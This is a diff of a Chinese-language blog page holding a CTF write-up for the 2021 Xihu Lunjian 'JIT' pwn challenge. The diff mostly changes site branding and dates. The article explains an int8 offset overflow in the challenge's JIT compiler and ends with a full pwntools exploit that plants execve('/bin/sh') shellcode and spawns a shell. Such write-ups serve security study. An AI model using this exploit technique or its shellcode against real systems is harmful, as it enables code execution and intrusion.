@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="西湖论剑2021JIT, Hexo">
+    <meta name="keywords" content="西湖论剑2021JIT, q1ming">
     <meta name="description" content="百无聊赖之中复现一下西湖论剑的JIT
 静态分析
 
@@ -34,7 +34,7 @@ i">
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>西湖论剑2021JIT | Hexo</title>
+    <title>西湖论剑2021JIT | q1ming</title>
     <link rel="icon" type="image/png" href="/favicon.png">
     
 
@@ -81,7 +81,7 @@ i">
                     
                     <img src="/medias/logo.png" class="logo-img" alt="LOGO">
                     
-                    <span class="logo-span">Hexo</span>
+                    <span class="logo-span">q1ming</span>
                 </a>
             </div>
             
@@ -185,7 +185,7 @@ i">
         
         <img src="/medias/logo.png" class="logo-img circle responsive-img">
         
-        <div class="logo-name">Hexo</div>
+        <div class="logo-name">q1ming</div>
         <div class="logo-desc">
             
             Never really desperate, only the lost of the soul.
@@ -400,7 +400,7 @@ i">
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>Publish Date:&nbsp;&nbsp;
-                    2025-01-15
+                    2025-01-16
                 </div>
                 
 
@@ -425,21 +425,21 @@ i">
         <div class="card-content article-card-content">
             <div id="articleContent">
                 <p>百无聊赖之中复现一下西湖论剑的JIT</p>
-<h2 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h2><p><img src="/images/1736931453490.png" alt="1736931453490"></p>
-<p><img src="/images/1736931463328.png" alt="1736931463328"></p>
+<h2 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h2><p><img src="/images/1736931453490.png"></p>
+<p><img src="/images/1736931463328.png"></p>
 <p>init分配一段可读可写可执行的内存，并写入大量0xcc</p>
-<h2 id="动态调试"><a href="#动态调试" class="headerlink" title="动态调试"></a>动态调试</h2><p><img src="/images/1736931472612.png" alt="1736931472612"></p>
+<h2 id="动态调试"><a href="#动态调试" class="headerlink" title="动态调试"></a>动态调试</h2><p><img src="/images/1736931472612.png"></p>
 <p>保护全开</p>
-<p><img src="/images/1736931482126.png" alt="1736931482126"></p>
-<p><img src="/images/1736931490807.png" alt="1736931490807"></p>
-<p><img src="/images/1736931498994.png" alt="1736931498994"></p>
-<p><img src="/images/1736931507281.png" alt="1736931507281"></p>
+<p><img src="/images/1736931482126.png"></p>
+<p><img src="/images/1736931490807.png"></p>
+<p><img src="/images/1736931498994.png"></p>
+<p><img src="/images/1736931507281.png"></p>
 <p>这个函数最终具有写那片内存的功能；</p>
-<p><img src="/images/1736931515631.png" alt="1736931515631"></p>
+<p><img src="/images/1736931515631.png"></p>
 <p>似乎都是从bss上取固定的代码；</p>
-<p><img src="/images/1736931523737.png" alt="1736931523737"></p>
+<p><img src="/images/1736931523737.png"></p>
 <p>func6</p>
-<p><img src="/images/1736931539127.png" alt="1736931539127"></p>
+<p><img src="/images/1736931539127.png"></p>
 <p>最后的检查：</p>
 <figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> ( !<span class="hljs-built_in">std</span>::<span class="hljs-built_in">unordered_map</span>&lt;<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>,Compiler::func&gt;::count(&amp;Compiler::funcs, &amp;__x)<span class="hljs-comment">// 必须存在0号函数</span><br>   || (__k = <span class="hljs-number">0</span>, <span class="hljs-built_in">std</span>::<span class="hljs-built_in">unordered_map</span>&lt;<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>,Compiler::func&gt;::operator[](&amp;Compiler::funcs, &amp;__k)-&gt;args)<span class="hljs-comment">// 这个只看idx为0的函数的参数的个数</span><br>   || (v5 = <span class="hljs-number">0</span>,<br>       base = (<span class="hljs-type">char</span> *)<span class="hljs-built_in">std</span>::<span class="hljs-built_in">unordered_map</span>&lt;<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>,Compiler::func&gt;::operator[](&amp;Compiler::funcs, &amp;v5)-&gt;base,<br>       v1 = <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span>::size(&amp;boot),<br>       base != (<span class="hljs-type">char</span> *)entry + v1) )           <span class="hljs-comment">// 0号函数必须在最前面</span><br> &#123;<br>   fatal();<br> &#125;<br></code></pre></td></tr></table></figure>
 
@@ -447,27 +447,27 @@ i">
 
 
 
-<p><img src="/images/1736931548173.png" alt="1736931548173"></p>
+<p><img src="/images/1736931548173.png"></p>
 <p>boot代码中添加了一个hlt指令，使得我们执行完func0之后就会ret到这个hlt指令上，导致触发异常；</p>
-<h4 id="func6的call指令逆向分析"><a href="#func6的call指令逆向分析" class="headerlink" title="func6的call指令逆向分析"></a>func6的call指令逆向分析</h4><p><img src="/images/1736931556901.png" alt="1736931556901"></p>
-<p><img src="/images/1736931565600.png" alt="1736931565600"></p>
-<p><img src="/images/1736931575303.png" alt="1736931575303"></p>
+<h4 id="func6的call指令逆向分析"><a href="#func6的call指令逆向分析" class="headerlink" title="func6的call指令逆向分析"></a>func6的call指令逆向分析</h4><p><img src="/images/1736931556901.png"></p>
+<p><img src="/images/1736931565600.png"></p>
+<p><img src="/images/1736931575303.png"></p>
 <p>可以发现0时直接call这个hlt，下面需要静态分析查找这个地址时如何计算出来的；</p>
-<p><img src="/images/1736931585795.png" alt="1736931585795"></p>
-<p><img src="/images/1736931595186.png" alt="1736931595186"></p>
-<h4 id="retidx的作用"><a href="#retidx的作用" class="headerlink" title="retidx的作用"></a>retidx的作用</h4><p><img src="/images/1736931605114.png" alt="1736931605114"></p>
-<p><img src="/images/1736931613930.png" alt="1736931613930"></p>
-<p><img src="/images/1736931622788.png" alt="1736931622788"></p>
+<p><img src="/images/1736931585795.png"></p>
+<p><img src="/images/1736931595186.png"></p>
+<h4 id="retidx的作用"><a href="#retidx的作用" class="headerlink" title="retidx的作用"></a>retidx的作用</h4><p><img src="/images/1736931605114.png"></p>
+<p><img src="/images/1736931613930.png"></p>
+<p><img src="/images/1736931622788.png"></p>
 <p>此时我们传进去的retidx时0x82</p>
-<p><img src="/images/1736931631492.png" alt="1736931631492"></p>
-<p><img src="/images/1736931641349.png" alt="1736931641349"></p>
+<p><img src="/images/1736931631492.png"></p>
+<p><img src="/images/1736931641349.png"></p>
 <p>改成0x86之后：</p>
-<p><img src="/images/1736931649010.png" alt="1736931649010"></p>
+<p><img src="/images/1736931649010.png"></p>
 <p>所以这个retidx就是确定返回值写在什么地方的；</p>
 <h4 id="对整体流程的把握"><a href="#对整体流程的把握" class="headerlink" title="对整体流程的把握"></a>对整体流程的把握</h4><p>idx&#x3D;0的函数相当于是main函数，所以不能有参数，然后别的函数就是我们规定好参数的个数，然后调用的时候就要符合接口定义；</p>
 <p>至于检查参数的正负之分，则纯粹是区别于外部参数和自己开辟的局部变量；</p>
 <h4 id="c-unsorted-map底层实现"><a href="#c-unsorted-map底层实现" class="headerlink" title="c++unsorted map底层实现"></a>c++unsorted map底层实现</h4><p>C++ STL 标准库中，不仅是 unordered_map 容器，所有无序容器的底层实现都采用的是哈希表存储结构。更准确地说，是用“链地址法”（又称“开链法”）解决数据存储位置发生冲突的哈希表</p>
-<p><img src="/images/1736931664380.png" alt="1736931664380"></p>
+<p><img src="/images/1736931664380.png"></p>
 <p>不仅如此，在 C++ STL 标准库中，将图 1 中的各个链表称为</p>
 <p>桶（bucket）</p>
 <p>，每个桶都有自己的编号（从 0 开始）。当有新键值对存储到无序容器中时，整个存储过程分为如下几步：</p>
@@ -483,30 +483,30 @@ i">
 <p>默认情况下，无序容器的最大负载因子为 1.0。如果操作无序容器过程中，使得最大复杂因子超过了默认值，则容器会自动增加桶数，并重新进行哈希，以此来减小负载因子的值。需要注意的是，此过程会导致容器迭代器失效，但指向单个键值对的引用或者指针仍然有效。</p>
 <h4 id="std-Hashtable"><a href="#std-Hashtable" class="headerlink" title="std::_Hashtable"></a>std::_Hashtable</h4><h5 id="find"><a href="#find" class="headerlink" title="find"></a>find</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">https://zhuanlan.zhihu.com/p/644205339<br></code></pre></td></tr></table></figure>
 
-<p><img src="/images/1736931674263.png" alt="1736931674263"></p>
+<p><img src="/images/1736931674263.png"></p>
 <p>选择function  idx&#x3D;0 得到的数据结构：</p>
-<p><img src="/images/1736931682600.png" alt="1736931682600"></p>
+<p><img src="/images/1736931682600.png"></p>
 <p>但是为什么看不到定义的其他几个函数呢？</p>
 <p>我们在堆空间内向下延伸、去呃呃并没有找到；</p>
 <p>懂了，这是在创建第一个函数，后边还没创建呢；</p>
-<p><img src="/images/1736931690648.png" alt="1736931690648"></p>
+<p><img src="/images/1736931690648.png"></p>
 <p>可以看到此时已经有许多函数了；</p>
 <p>可是我们一开始执行的是main函数，且main函数必须在一开始就被创建、那我们又该如何调用其他函数呢？</p>
-<h2 id="又没找到漏洞？？？"><a href="#又没找到漏洞？？？" class="headerlink" title="又没找到漏洞？？？"></a>又没找到漏洞？？？</h2><p><img src="/images/1736931697951.png" alt="1736931697951"></p>
+<h2 id="又没找到漏洞？？？"><a href="#又没找到漏洞？？？" class="headerlink" title="又没找到漏洞？？？"></a>又没找到漏洞？？？</h2><p><img src="/images/1736931697951.png"></p>
 <p>这个局部变量的偏移计算，如果使用-32、会存在一个int8的整型溢出，溢出为0覆盖返回地址，就有劫持控制流的可能；</p>
-<p><img src="/images/1736931707654.png" alt="1736931707654"></p>
-<h3 id="短小shellcode的书写"><a href="#短小shellcode的书写" class="headerlink" title="短小shellcode的书写"></a>短小shellcode的书写</h3><p><img src="/images/1736931747783.png" alt="1736931747783"></p>
-<p><img src="/images/1736931763494.png" alt="1736931763494"></p>
+<p><img src="/images/1736931707654.png"></p>
+<h3 id="短小shellcode的书写"><a href="#短小shellcode的书写" class="headerlink" title="短小shellcode的书写"></a>短小shellcode的书写</h3><p><img src="/images/1736931747783.png"></p>
+<p><img src="/images/1736931763494.png"></p>
 <p>可以看到这个mov_imm指令可以让我们一次向代码区域内写连续8个字节的shellcode；</p>
-<p><img src="/images/1736931775134.png" alt="1736931775134"></p>
+<p><img src="/images/1736931775134.png"></p>
 <p>从这张图则可以看出这些8字节shellcode之间的距离为0x11；</p>
-<p><img src="/images/1736931782574.png" alt="1736931782574"></p>
+<p><img src="/images/1736931782574.png"></p>
 <p>这里有一个10字节指令、我们做不到、所以必须对其进行改进</p>
 <p>重新自己动手编写shellcode，保证所有的长度都在6字节以内：</p>
-<p><img src="/images/1736931789628.png" alt="1736931789628"></p>
+<p><img src="/images/1736931789628.png"></p>
 <figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python">nums = []<br><br>shell = <span class="hljs-string">b&#x27;\x6a\x68&#x27;</span><br>shell += asm(<span class="hljs-string">&quot;mov eax, 0x68732f2f&quot;</span>)<br>shell += asm(<span class="hljs-string">&quot;shl rax, 32&quot;</span>)<br>shell += asm(<span class="hljs-string">&quot;or rax, 0x6e69622f&quot;</span>)<br>shell += asm(<span class="hljs-string">&quot;push rax&quot;</span>)<br>shell += asm(<span class="hljs-string">&quot;mov rdi, rsp&quot;</span>)<br>shell += asm(<span class="hljs-string">&quot;xor rsi, rsi&quot;</span>)<br>shell += asm(<span class="hljs-string">&quot;xor rdx, rdx&quot;</span>)<br>shell += asm(<span class="hljs-string">&quot;xor eax, eax&quot;</span>)<br>shell += asm(<span class="hljs-string">&quot;mov eax, 0x3b&quot;</span>)<br>shell += asm(<span class="hljs-string">&quot;syscall&quot;</span>)<br><span class="hljs-built_in">print</span>(disasm(shell))<br>pause()<br><br>nums = [<span class="hljs-number">0x90909090686a</span>, <span class="hljs-number">0x90732f2f2fb8</span>, <span class="hljs-number">0x909020e0c148</span>, <span class="hljs-number">0x6e69622f0d48</span>, <span class="hljs-number">0x909090909050</span>, <span class="hljs-number">0x909090e78948</span>, <span class="hljs-number">0x909090f63148</span>, <span class="hljs-number">0x909090d23148</span>, <span class="hljs-number">0x90909090c031</span>, <span class="hljs-number">0x900000003bb8</span>, <span class="hljs-number">0x90909090050f</span>]<br><br>code_num = []<br><span class="hljs-keyword">for</span> num <span class="hljs-keyword">in</span> nums:<br><br>    new_num = num | <span class="hljs-number">0x9eb000000000000</span><br>    code_num.append(new_num)<br><br>dbg(<span class="hljs-number">0x2ee8</span>)<br>code = p8(<span class="hljs-number">0xff</span>)+p8(<span class="hljs-number">0</span>)+p8(<span class="hljs-number">0</span>)+p8(<span class="hljs-number">0x20</span>)<br><span class="hljs-keyword">for</span> num <span class="hljs-keyword">in</span> code_num:<br>    code += mov_imm(<span class="hljs-number">0x81</span>, num)<br><br><br></code></pre></td></tr></table></figure>
 
-<h2 id="攻击成功"><a href="#攻击成功" class="headerlink" title="攻击成功"></a>攻击成功</h2><p><img src="/images/1736931800807.png" alt="1736931800807"></p>
+<h2 id="攻击成功"><a href="#攻击成功" class="headerlink" title="攻击成功"></a>攻击成功</h2><p><img src="/images/1736931800807.png"></p>
 <h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>file = <span class="hljs-string">&#x27;./jit&#x27;</span><br>sh = process(file)<br><span class="hljs-comment">#sh = remote(&#x27;node4.buuoj.cn&#x27;, 2)</span><br>elf = ELF(file)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ru</span>(<span class="hljs-params">string</span>):<br>    sh.recvuntil(string)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dbg</span>(<span class="hljs-params">c = <span class="hljs-number">0</span></span>):<br>    <span class="hljs-keyword">if</span> c :<br>        order = <span class="hljs-string">&#x27;b *$rebase(&#x27;</span>+<span class="hljs-built_in">str</span>(c)+<span class="hljs-string">&#x27;)&#x27;</span><br>        gdb.attach(sh, order)<br>    <span class="hljs-keyword">else</span>:<br>        gdb.attach(sh)<br>        pause()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sl</span>(<span class="hljs-params">content</span>):<br>    sh.sendline(content)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">itr</span>():<br>    sh.interactive()<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">mov_imm</span>(<span class="hljs-params">off, imm</span>):<br>    res = p8(<span class="hljs-number">1</span>) + p8(off) + p64(imm)<br>    <span class="hljs-keyword">return</span> res<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">cmp</span>(<span class="hljs-params">off1, off2</span>):<br>    res = p8(<span class="hljs-number">2</span>) + p8(off1) + p8(off2)<br>    <span class="hljs-keyword">return</span> res<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">_and</span>(<span class="hljs-params">off1, off2</span>):<br>    res = p8(<span class="hljs-number">3</span>) + p8(off1) + p8(off2)<br>    <span class="hljs-keyword">return</span> res<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">_or</span>(<span class="hljs-params">off1, off2</span>):<br>    res = p8(<span class="hljs-number">4</span>) + p8(off1) + p8(off2)<br>    <span class="hljs-keyword">return</span> res<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">_xor</span>(<span class="hljs-params">off1, off2</span>):<br>    res = p8(<span class="hljs-number">5</span>) + p8(off1) + p8(off2)<br>    <span class="hljs-keyword">return</span> res<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">_ret</span>():<br>    res = p8(<span class="hljs-number">0</span>) + p8(<span class="hljs-number">1</span>)<br>    <span class="hljs-keyword">return</span> res<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">call</span>(<span class="hljs-params">fnid, retvar, args=<span class="hljs-number">0</span></span>):<br>    res = p8(<span class="hljs-number">6</span>) + p8(fnid) + p8(retvar) + p8(args)<br>    <span class="hljs-keyword">return</span> res<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">_code1</span>(<span class="hljs-params">idx</span>):<br>    code1 = p8(<span class="hljs-number">0xff</span>)+p8(idx)+p8(<span class="hljs-number">0x6</span>)+p8(<span class="hljs-number">0x20</span>)<br>    code1 += p8(<span class="hljs-number">2</span>) + p8(<span class="hljs-number">1</span>) + p8(<span class="hljs-number">2</span>)<br>    code1 += p8(<span class="hljs-number">1</span>) + p8(<span class="hljs-number">0x3</span>) + p64(<span class="hljs-number">0x1234</span>)<br>    code1 += p8(<span class="hljs-number">3</span>) + p8(<span class="hljs-number">3</span>) + p8(<span class="hljs-number">4</span>)<br>    code1 += p8(<span class="hljs-number">4</span>) + p8(<span class="hljs-number">3</span>) + p8(<span class="hljs-number">4</span>)<br>    code1 += p8(<span class="hljs-number">5</span>) + p8(<span class="hljs-number">3</span>) + p8(<span class="hljs-number">4</span>)<br>    code1 += mov_imm(<span class="hljs-number">0x82</span>, <span class="hljs-number">0x123456</span>)<br>    code1 += _ret()<br>    <span class="hljs-keyword">return</span> code1<br><br><br>entry = <span class="hljs-number">0x2504</span><br><br>context.arch = <span class="hljs-string">&quot;amd64&quot;</span><br>context.os = <span class="hljs-string">&quot;linux&quot;</span><br>shellcode = asm(shellcraft.sh())<br><br>count = <span class="hljs-number">0</span><br>nums = []<br><br>shell = <span class="hljs-string">b&#x27;\x6a\x68&#x27;</span><br>shell += asm(<span class="hljs-string">&quot;mov eax, 0x68732f2f&quot;</span>)<br>shell += asm(<span class="hljs-string">&quot;shl rax, 32&quot;</span>)<br>shell += asm(<span class="hljs-string">&quot;or rax, 0x6e69622f&quot;</span>)<br>shell += asm(<span class="hljs-string">&quot;push rax&quot;</span>)<br>shell += asm(<span class="hljs-string">&quot;mov rdi, rsp&quot;</span>)<br>shell += asm(<span class="hljs-string">&quot;xor rsi, rsi&quot;</span>)<br>shell += asm(<span class="hljs-string">&quot;xor rdx, rdx&quot;</span>)<br>shell += asm(<span class="hljs-string">&quot;xor eax, eax&quot;</span>)<br>shell += asm(<span class="hljs-string">&quot;mov eax, 0x3b&quot;</span>)<br>shell += asm(<span class="hljs-string">&quot;syscall&quot;</span>)<br><span class="hljs-built_in">print</span>(disasm(shell))<br><span class="hljs-comment">#pause()</span><br><br>nums = [<span class="hljs-number">0x90909090686a</span>, <span class="hljs-number">0x90732f2f2fb8</span>, <span class="hljs-number">0x909020e0c148</span>, <span class="hljs-number">0x6e69622f0d48</span>, <span class="hljs-number">0x909090909050</span>, <span class="hljs-number">0x909090e78948</span>, <span class="hljs-number">0x909090f63148</span>, <span class="hljs-number">0x909090d23148</span>, <span class="hljs-number">0x90909090c031</span>, <span class="hljs-number">0x900000003bb8</span>, <span class="hljs-number">0x90909090050f</span>]<br><br>code_num = []<br><span class="hljs-keyword">for</span> num <span class="hljs-keyword">in</span> nums:<br><br>    new_num = num | <span class="hljs-number">0x9eb000000000000</span><br>    code_num.append(new_num)<br><br><span class="hljs-comment">#dbg()</span><br>code = p8(<span class="hljs-number">0xff</span>)+p8(<span class="hljs-number">0</span>)+p8(<span class="hljs-number">0</span>)+p8(<span class="hljs-number">0x20</span>)<br><span class="hljs-keyword">for</span> num <span class="hljs-keyword">in</span> code_num:<br>    code += mov_imm(<span class="hljs-number">0x81</span>, num)<br><span class="hljs-comment">#code += call(0, 0x86)</span><br>code += mov_imm(<span class="hljs-number">0x83</span>, <span class="hljs-number">0xfffffffffffff000</span>)<br>code += mov_imm(<span class="hljs-number">0x84</span>, <span class="hljs-number">0x14</span>)<br>code += _<span class="hljs-keyword">and</span>(<span class="hljs-number">0xa0</span>, <span class="hljs-number">0x83</span>)<br>code += _<span class="hljs-keyword">or</span>(<span class="hljs-number">0xa0</span>, <span class="hljs-number">0x84</span>)<br><span class="hljs-comment">#code += mov_imm(0xa0, 0x1234567812345678) * 0x10</span><br>code += p8(<span class="hljs-number">0</span>) + p8(<span class="hljs-number">0x81</span>)<br><br><br><br>sh.send(code)<br><br>sh.interactive()<br><br><br></code></pre></td></tr></table></figure>
 
 
@@ -525,7 +525,7 @@ i">
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="/about" rel="external nofollow noreferrer">John Doe</a>
+                    <a href="/about" rel="external nofollow noreferrer">q1ming</a>
                 </span>
             </div>
             <div class="reprint__type">
@@ -535,7 +535,7 @@ i">
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://example.com/2025/01/15/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91JIT/">http://example.com/2025/01/15/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91JIT/</a>
+                    <a href="http://example.com/2025/01/16/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91JIT/">http://example.com/2025/01/16/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91JIT/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -548,7 +548,7 @@ i">
                     All articles in this blog are used except for special statements
                     <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
                     reprint policy. If reproduced, please indicate source
-                    <a href="/about" target="_blank">John Doe</a>
+                    <a href="/about" target="_blank">q1ming</a>
                     !
                 </span>
             </div>
@@ -657,17 +657,18 @@ i">
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;Previous</div>
+                <i class="far fa-dot-circle"></i>&nbsp;Current
+            </div>
             <div class="card">
-                <a href="/2025/01/15/md5/">
+                <a href="/2025/01/16/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91JIT/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/22.jpg" class="responsive-img" alt="md5">
+                        <img src="/medias/featureimages/18.jpg" class="responsive-img" alt="西湖论剑2021JIT">
                         
-                        <span class="card-title">md5</span>
+                        <span class="card-title">西湖论剑2021JIT</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -677,22 +678,27 @@ i">
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2025-01-15
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2025-01-16
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-user fa-fw"></i>
-                            John Doe
+                            q1ming
                             
                         </span>
                     </div>
                 </div>
+
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/Crypto/">
-                        <span class="chip bg-color">Crypto</span>
+                    <a href="/tags/CTF/">
+                        <span class="chip bg-color">CTF</span>
+                    </a>
+                    
+                    <a href="/tags/VM/">
+                        <span class="chip bg-color">VM</span>
                     </a>
                     
                 </div>
@@ -706,13 +712,13 @@ i">
                 Next&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2025/01/15/pcb_2024_vm/">
+                <a href="/2025/01/16/%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81ker/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/10.jpg" class="responsive-img" alt="pcb_2024_vm">
+                        <img src="/medias/featureimages/23.jpg" class="responsive-img" alt="强网拟态ker">
                         
-                        <span class="card-title">pcb_2024_vm</span>
+                        <span class="card-title">强网拟态ker</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -723,12 +729,12 @@ i">
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2025-01-15
+                                <i class="far fa-clock fa-fw icon-date"></i>2025-01-16
                             </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-user fa-fw"></i>
-                            John Doe
+                            q1ming
                             
                         </span>
                     </div>
@@ -736,16 +742,12 @@ i">
                 
                 <div class="card-action article-tags">
                     
+                    <a href="/tags/kernel/">
+                        <span class="chip bg-color">kernel</span>
+                    </a>
+                    
                     <a href="/tags/CTF/">
                         <span class="chip bg-color">CTF</span>
-                    </a>
-                    
-                    <a href="/tags/VM/">
-                        <span class="chip bg-color">VM</span>
-                    </a>
-                    
-                    <a href="/tags/SandBox/">
-                        <span class="chip bg-color">SandBox</span>
                     </a>
                     
                 </div>
@@ -936,7 +938,7 @@ i">
             
                 <span id="year">2019-2025</span>
             
-            <a href="/about" target="_blank">John Doe</a>
+            <a href="/about" target="_blank">q1ming</a>
             |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
             |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
             
